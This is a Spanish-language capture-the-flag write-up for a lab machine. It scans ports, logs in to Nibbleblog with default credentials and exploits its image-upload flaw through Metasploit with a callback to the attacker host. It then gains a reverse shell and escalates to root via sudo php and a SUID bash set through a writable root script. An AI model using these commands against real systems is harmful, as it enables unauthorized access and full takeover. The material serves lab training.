# chocolatelovers

* Máquina **atacante** -> 172.17.0.1
* Máquina **objetivo** -> 172.17.0.2 | Linux :penguin:

### Escaneo de puertos

Realizamos un escaneo de puertos con *nmap* para ver puertos abiertos de la máquina **objetivo**:
```shell
nmap -p- --open -sS -sC -sV --min-rate 2000 -n -vvv -Pn 172.17.0.2
```
![escaneo](/Capturas/2024-11-27_19-15.png)

Encontramos únicamente el puerto **80** abierto, por lo que vamos al navegador y vemos que hay una plantilla de apache estándar. Al ver el código fuente de la página, encontramos comentado **/nibbleblog**:

![comentado](/Capturas/2024-11-27_19-24.png)

### Fuzzing web

Lo que hemos visto comentado se trata de un directorio situado en la máquina **objetivo**, porque si accedemos a *172.17.0.2/nibbleblog*, nos aparece este blog:

![blog](/Capturas/2024-11-27_19-26.png)

Por lo que ahora, realizaremos **fuzzing web** sobre esta dirección con *gobuster*:
```shell
gobuster dir -u http://172.17.0.2/nibbleblog -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x .txt,.py,.php,.sh
```
![gobuster](/Capturas/2024-11-27_19-28.png)

Observamos que hay multitud de directorios, por lo que debemos ir investigando uno por uno en busca de información. Al acceder a *172.17.0.2/nibbleblog/admin.php*, encontramos un **panel de login**. Y si nos vamos dentro de **/content/users**, vemos que hay un usuario llamado **admin**, por lo que intentamos acceder con las credenciales **admin:admin** y tenemos acceso al portal:

![portal](/Capturas/2024-11-27_19-33.png)

Siguiendo con la investigación, buscamos en internet sobre alguna vulnerabilidad conocida en la versión que tenemos corriendo de **nibbleblog**. Resulta que existe una vulnerabilidad conocida de esta versión que podemos explotar con *metasploit*, la cual usa el plugin **my image** para ser explotada y poder subir un archivo malicioso. Así que primero debemos instalar dicho plugin:

![plugin](/Capturas/2024-11-27_19-36.png)

### Metasploit

Con el plugin ya instalado, buscamos el exploit:

![busquedaexploit](/Capturas/2024-11-27_19-38.png)

Y lo configuramos y ejecutamos:
```shell
set PASSWORD admin
set RHOSTS 172.17.0.2
set TARGETURI /nibbleblog
set USERNAME admin
set LHOST 172.17.0.1
```
![ejecucion](/Capturas/2024-11-27_19-41.png)

Y con esto, conseguimos una sesión de *meterpreter*. Ahora simplemente nos mandamos una reverse shell por el puerto que queramos y ya estamos dentro:

![dentro](/Capturas/2024-11-27_19-43.png)

### Escalada de privilegios

Para escalar privilegios, vemos que podemos ejecutar php como el usuario **chocolate**, por lo que ejecutamos el siguiente comando para acceder como dicho usuario:
```shell
sudo -u chocholate php -r "system('/bin/sh');"
```
![chocolate](/Capturas/2024-11-27_19-46.png)

Si visualizamos los procesos `ps -e -f`, vemos que hay uno extraño:

![ps](/Capturas/2024-11-27_19-48.png)

Podemos aprovechar el script **script.php** para cambiarle los permisos a la bash y escalar privilegios. Por lo que ejecutamos:
```shell
echo '<?php exec("chmod u+s /bin/bash"); ?>' > /opt/script.php
```
Y ahora nos lanzamos una bash con `bash -p`:

![root](/Capturas/2024-11-27_19-51.png)

Para ser usuario **root** :triangular_flag_on_post: